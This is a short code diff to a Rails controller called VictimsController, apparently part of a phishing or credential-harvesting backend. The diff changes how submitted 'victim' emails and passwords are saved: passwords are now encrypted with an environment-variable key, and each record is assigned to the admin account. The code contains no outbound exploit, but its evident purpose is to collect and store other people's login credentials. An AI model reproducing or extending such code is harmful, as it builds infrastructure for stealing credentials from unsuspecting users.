@@ -7,11 +7,13 @@ class VictimsController < ApplicationController
   end
 
   def create
+    admin = User.find_by({name: "admin"})
+
     victim = Victim.new(
       email: params[:email],
-      password: params[:password],
+      password: AESCrypt.encrypt(params[:password], ENV["YOUR_FUNNY"]),
       method: params[:method],
-      user_id: 1
+      user_id: admin.id
     )
     if victim.save
       render json: {status: "You have successly created a victim"}, status: :created
